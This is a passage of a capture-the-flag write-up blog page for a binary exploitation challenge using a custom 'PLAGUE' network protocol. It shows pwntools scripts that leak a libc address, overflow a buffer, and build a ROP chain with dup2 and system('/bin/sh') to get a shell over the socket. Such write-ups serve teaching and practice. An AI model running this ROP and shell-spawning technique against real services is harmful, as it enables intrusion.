</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">slog</span>(k, v): <span style="color:#66d9ef">return</span> success(<span style="color:#e6db74">&#39; : &#39;</span><span style="color:#f92672">.</span>join([k, v]))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clog</span>(k, v): <span style="color:#66d9ef">return</span> log<span style="color:#f92672">.</span>critical(<span style="color:#e6db74">&#39; : &#39;</span><span style="color:#f92672">.</span>join([k, v]))
</span></span><span style="display:flex;"><span><span style="color:#75715e"># action  target_competitor version </span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">9001</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;PLAGUE YOUDONTKNOWMESON 1.0</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Plague-Target:dddddddddd</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>) 
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Content-Length: 2048</span><span style="color:#ae81ff">\r\n\r</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2048</span>)
</span></span><span style="display:flex;"><span>p1 <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">9001</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;PLAGUE SOMEONE 2.0</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Plague-Target:asasdadad</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>) 
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Content-Length: 2000</span><span style="color:#ae81ff">\r\n\r</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(p1<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>))
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> (u64(p1<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)))
</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1ecbe0</span>
</span></span><span style="display:flex;"><span>clog(<span style="color:#e6db74">&#34;leak : &#34;</span>,hex(leak))
</span></span><span style="display:flex;"><span>clog(<span style="color:#e6db74">&#34;libc_leak : &#34;</span>,hex(libc_base))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>poprsi <span style="color:#f92672">=</span>libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x000000000002601f</span>
</span></span><span style="display:flex;"><span>poprdi<span style="color:#f92672">=</span>libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000000000023b6a</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">9001</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;VIEW jomama 1.0</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>clog(<span style="color:#e6db74">&#34;ret&#34;</span>,hex(poprdi<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">2079</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(poprdi) <span style="color:#75715e"># pop rdi ret </span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1b45bd</span>) <span style="color:#75715e"># binsh </span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(libc_base<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]) <span style="color:#75715e"># system</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(p1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Our exploit runs successfully but we dont get a shell ???</p>
<p><img alt="houston" src="/images/houston-we-have-a-problem-tom-hanks.gif"></p>
<p>well whats happening is when we run <code>system(&quot;/bin/sh&quot;)</code> the shell spawns on the programs file descriptors STDIO(0) and STDOUT(1) . which we dont control we have our own file descriptor for each socket . Unlike our program we only have one read-write fd for our socket .</p>
<p>how to tackle this ?</p>
<p><a href="https://man7.org/linux/man-pages/man2/dup.2.html"><em><strong>dup</strong></em></a>
<em>The dup() system call allocates a new file descriptor that refers
to the same open file description as the descriptor oldfd.  (For
an explanation of open file descriptions, see open(2).)  The new
file descriptor number is guaranteed to be the lowest-numbered
file descriptor that was unused in the calling process.</em></p>
<p><a href="https://man7.org/linux/man-pages/man2/dup.2.html"><em><strong>dup2()</strong></em></a>
<em>The dup2() system call performs the same task as dup(), but
instead of using the lowest-numbered unused file descriptor, it
uses the file descriptor number specified in newfd.  In other
words, the file descriptor newfd is adjusted so that it now
refers to the same open file description as oldfd</em>.
<strong>Usage :</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">dup2</span>(<span style="color:#66d9ef">int</span> oldfd, <span style="color:#66d9ef">int</span> newfd);
</span></span></code></pre></div><p>so we can use dup2 to duplicate our socket&rsquo;s files descriptor with the programs stdio and stdout like so:</p>
<p><em><strong>NOTE: This will close our programs stdio and stdout (fds 0 and 1 respectively)</strong></em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#a6e22e">dup2</span>(<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">0</span>); 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">dup2</span>(<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">1</span>);
</span></span></code></pre></div><p>I used gdb to find the socket&rsquo;s fd of my final connection.</p>
<h2 id="final-exploit">Final Exploit<a href="#final-exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">slog</span>(k, v): <span style="color:#66d9ef">return</span> success(<span style="color:#e6db74">&#39; : &#39;</span><span style="color:#f92672">.</span>join([k, v]))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clog</span>(k, v): <span style="color:#66d9ef">return</span> log<span style="color:#f92672">.</span>critical(<span style="color:#e6db74">&#39; : &#39;</span><span style="color:#f92672">.</span>join([k, v]))
</span></span><span style="display:flex;"><span><span style="color:#75715e"># action  target_competitor version </span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">9001</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;PLAGUE YOUDONTKNOWMESON 1.0</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Plague-Target:dddddddddd</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>) 
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Content-Length: 2048</span><span style="color:#ae81ff">\r\n\r</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2048</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p1 <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">9001</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;PLAGUE SOMEONE 2.0</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Plague-Target:asasdadad</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>) 
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Content-Length: 2000</span><span style="color:#ae81ff">\r\n\r</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span>) <span style="color:#75715e"># leak  </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(p1<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>))
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> (u64(p1<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)))
</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1ecbe0</span>
</span></span><span style="display:flex;"><span>clog(<span style="color:#e6db74">&#34;leak : &#34;</span>,hex(leak))
</span></span><span style="display:flex;"><span>clog(<span style="color:#e6db74">&#34;libc_leak : &#34;</span>,hex(libc_base))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>poprsi <span style="color:#f92672">=</span>libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x000000000002601f</span>
</span></span><span style="display:flex;"><span>poprdi<span style="color:#f92672">=</span>libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000000000023b6a</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">9001</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;VIEW jomama 1.0</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>clog(<span style="color:#e6db74">&#34;ret&#34;</span>,hex(poprdi<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">2079</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(poprdi<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#75715e">#  ret </span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(poprdi) <span style="color:#75715e"># pop rdi ; ret</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x6</span>) 
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(poprsi) <span style="color:#75715e"># pop rsi ; ret </span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x0</span>)
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(libc_base<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;dup2&#39;</span>]) <span style="color:#75715e"># dup2(6,0);</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(poprsi) <span style="color:#75715e"># pop rsi ; ret </span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(libc_base<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;dup2&#39;</span>]) <span style="color:#75715e"># dup2(6,1);</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(poprdi) <span style="color:#75715e"># pop rdi ret </span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1b45bd</span>) <span style="color:#75715e"># binsh </span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span>p64(libc_base<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]) <span style="color:#75715e"># system</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(p1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h3 id="output">Output<a href="#output" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p><img alt="oracle_out" src="/images/oracle_shell.png"></p>
<h2 id="gloater-insane">Gloater [insane]<a href="#gloater-insane" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p><em><strong>writeup coming soon</strong></em></p>
<h2 id="mist-in-maze">Mist in Maze<a href="#mist-in-maze" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p><em><strong>writeup coming soon</strong></em></p>
<h2 id="sos">sos<a href="#sos" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p><em><strong>writeup coming soon</strong></em></p>

      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>Â© 2024 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
